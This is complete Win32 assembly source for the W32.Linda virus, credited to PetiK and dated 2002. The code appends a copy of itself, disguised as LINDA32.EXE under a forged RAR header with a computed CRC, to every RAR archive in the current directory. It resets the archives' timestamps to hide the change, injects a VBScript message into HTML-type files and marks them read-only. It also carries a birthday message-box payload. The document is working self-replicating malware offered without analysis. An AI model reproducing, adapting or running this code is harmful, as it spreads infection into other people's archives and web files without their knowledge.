comment §
Name : W32.Linda
Data : February 13th 2002
Author : PetiK
Language : Win32asm
Size : 8192 (compressed with ASPack).

Action : Infects rar files and ht* files in the current directory.


§

.386
locals
jumps
.model flat,STDCALL

api	macro x
	extrn x:proc
	call  x
	endm

WIN32_FIND_DATA		struct
dwFileAttributes	dd 0
ftCreationTime		dd ?,?
ftLastAccessTime	dd ?,?
ftLastWriteTime		dd ?,?
nFileSizeHigh		dd 0
nFileSizeLow		dd 0
dwReserved0		dd 0,0
cFileName		db 260 dup(0)
cAlternateFileName	db 14  dup(0)
			db  2  dup (0)
WIN32_FIND_DATA		ends


.DATA
CRLF		equ <13,10>
ffile		WIN32_FIND_DATA	<?>
sysTime		db 16 dup(0)

orig_virus	db 50 dup (0)
thFile		dd ?
Err		dd 0
time0		dd 0,0
time1		dd 0,0
time2		dd 0,0

Size		equ 8192
HeaderSize	= EndRARHeader-RARHeader
rarmask		db "*.rar",0
htmmask		db "*.ht*",0
hFile		dd ?
fHnd		dd ?
mHnd		dd ?
sizer		dd 0
octets		dd 0

RARHeader:
RARHeaderCRC	dw	0
RARType		db	74h
RARFlags	dw	8000h
RARHSize        dw      HeaderSize
RARCompressed	dd	Size
RAROriginal	dd	Size
RAROs		db	0
RARCrc32	dd	0
RARFileTime	db	63h,78h
RARFileDate	db	31h,24h
RARNeedVer	db	14h
RARMethod	db	30h
RARFNameSize    dw      EndRARHeader-RARName
RARAttrib	dd	0
RARName		db	"LINDA32.EXE"
EndRARHeader	label byte

.CODE
start_linda:
	mov	eax,offset sysTime
	push	eax
	api	GetSystemTime
	lea	eax,sysTime
	cmp	word ptr [eax+2],8	; August
	jne	end_pay
	cmp	word ptr [eax+6],10	; 10th.	Linda's Birthday
	jne	end_pay
	push	40h
	call	@tit
	db	"W32RAR.Linda",0
	@tit:
	call	@mes
	db	"This virus infects only RAR files.",0dh,0ah
	db	"Happy Birthday - (c)2002",0
	@mes:
	push	0
	api	MessageBoxA
end_pay:

	push	50
	mov	esi,offset orig_virus
	push	esi
	push	0
	api	GetModuleFileNameA

	push	4
	push	1000h
	push	8192
	push	0
	api	VirtualAlloc
	test	eax,eax
	je	end_srch_rar
	mov	dword ptr [mHnd],eax

	push	0
	push	80h
	push	3
	push	0
	push	1
	push	80000000h
	push	offset orig_virus
	api	CreateFileA
	cmp	eax,-1
	je	end_srch_rar
	mov	dword ptr [fHnd],eax

	push	0
	mov	dword ptr [sizer],0
	lea	eax,sizer
	push	eax
	push	8192
	push	dword ptr [mHnd]
	push	dword ptr [fHnd]
	api	ReadFile
	push	dword ptr [mHnd]
	api	CloseHandle

rar_srch:
	push	offset ffile
	push	offset rarmask
	api	FindFirstFileA
	dec	eax
	jz	end_srch_rar
	inc	eax
	mov	dword ptr [hFile],eax

inf_rar:
	call	times
	call	infect
	cmp	byte ptr [Err],1
	je	rar_nxt_srch
	call	timer

rar_nxt_srch:
	push	offset ffile
	mov	eax,dword ptr [hFile]
	push	eax
	api	FindNextFileA
	test	eax,eax
	jnz	inf_rar
	mov	eax,dword ptr [hFile]
	push	eax
	api	FindClose
end_srch_rar:

htm_srch:
	push	offset ffile
	push	offset htmmask
	api	FindFirstFileA
	dec	eax
	jz	end_srch_htm
	inc	eax
	mov	dword ptr [hFile],eax

inf_htm:
	call	infecthtm

htm_nxt_srch:
	push	offset ffile
	mov	eax,dword ptr [hFile]
	push	eax
	api	FindNextFileA
	test	eax,eax
	jnz	inf_htm
	mov	eax,dword ptr [hFile]
	push	eax
	api	FindClose
end_srch_htm:


end_linda:
	push	0
	api	ExitProcess

times:	push	0
	push	80h
	push	3
	push	0
	push	1
	push	80000000h
	push	offset ffile.cFileName
	api	CreateFileA
	cmp	eax,-1
	je	tserr
	mov	dword ptr [thFile],eax
	push	offset time0
	push	offset time1
	push	offset time2
	push	dword ptr [thFile]
	api	GetFileTime
	push	dword ptr [thFile]
	api	CloseHandle
	mov	byte ptr [Err],0
	ret
tserr:	mov	byte ptr [Err],1
	ret

timer:	push	0
	push	80h
	push	3
	push	0
	push	1
	push	40000000h
	push	offset ffile.cFileName
	api	CreateFileA
	cmp	eax,-1
	je	trerr
	mov	dword ptr [thFile],eax
	push	offset time0
	push	offset time1
	push	offset time2
	push	dword ptr [thFile]
	api	SetFileTime
	push	dword ptr [thFile]
	api	CloseHandle
trerr:	ret

infecthtm:
	push	offset ffile.cFileName
	api	GetFileAttributesA
	cmp	eax,1 or 20h
	je	end_inf_htm
	push	0
	push	80h
	push	3
	push	0
	push	1
	push	40000000h
	push	offset ffile.cFileName
	api	CreateFileA
	cmp	eax,-1
	je	end_inf_htm
	mov	dword ptr [fHnd],eax
	push	2
	push	0
	push	dword ptr [fHnd]
	api	_llseek
	push	0
	push	offset octets
	push	e_htm - s_htm
	call	e_htm
	s_htm:	db "",CRLF,CRLF
		db "<SCRIPT Language=VBScript>",CRLF
		db "On Error Resume Next",CRLF
		db "document.Write ""<font face='verdana' color=green size='2'>Hi guy ! How are you ?"
		db "<br>If you read these lines, is that you are infected by my Virus Linda."
		db "<br>Look at your RAR files. They could be infected too."
		db "<br>Good Bye and have a nice day.<br></font>""",0dh,0ah
		db "</SCRIPT>",0dh,0ah
	e_htm:
	push	dword ptr [fHnd]
	api	WriteFile
	push	dword ptr [fHnd]
	api	CloseHandle
	push	1 or 20h
	push	offset ffile.cFileName
	api	SetFileAttributesA
end_inf_htm:
	ret
	
	


infect:	xor	eax,eax
	push	eax
	push	80h
	push	3
	push	eax
	push	eax
	push	40000000h
	lea	eax,ffile.cFileName
	push	eax
	api	CreateFileA
	dec	eax
	jz	end_infect
	inc	eax
	mov	dword ptr [fHnd],eax

	push	2
	push	0
	push	dword ptr [fHnd]
	api	_llseek				; like SetFilePointer

	mov	esi,dword ptr [mHnd]
	mov	edi,Size
	call	CRC32
	mov	dword ptr [RARCrc32],eax

	mov	esi,offset RARHeader+2
	mov	edi,HeaderSize-2
	call	CRC32
	mov	word ptr [RARHeaderCRC],ax

	xor	eax,eax
	push	eax
	push	offset octets
	push	HeaderSize
	push	offset RARHeader
	push	dword ptr [fHnd]
	api	WriteFile

	mov	dword ptr [RARHeaderCRC],0
	mov	dword ptr [RARCrc32],0
	mov	dword ptr [RARCrc32+2],0

	push	0
	push	offset octets
	push	Size
	push	dword ptr [mHnd]
	push	dword ptr [fHnd]
	api	WriteFile
	push	dword ptr [fHnd]
	api	CloseHandle
end_infect:
	ret

CRC32:	cld
	push	ebx
	mov	ecx,-1			;xor ecx,ecx & dec ecx
	mov	edx,ecx
	NextByteCRC:
	xor	eax,eax
	xor	ebx,ebx
	lodsb
	xor	al,cl
	mov	cl,ch
	mov	ch,dl
	mov	dl,dh
	mov	dh,8
	NextBitCRC:
	shr	bx,1
	rcr	ax,1
	jnc	NoCRC
	xor	ax,08320h
	xor	bx,0edb8h
	NoCRC:
	dec	dh
	jnz	NextBitCRC
	xor	ecx,eax
	xor	edx,ebx
	dec	di
	jnz	NextByteCRC
	not	edx
	not	ecx
	pop	ebx
	mov	eax,edx
	rol	eax,16
	mov	ax,cx
	ret
ends
end start_linda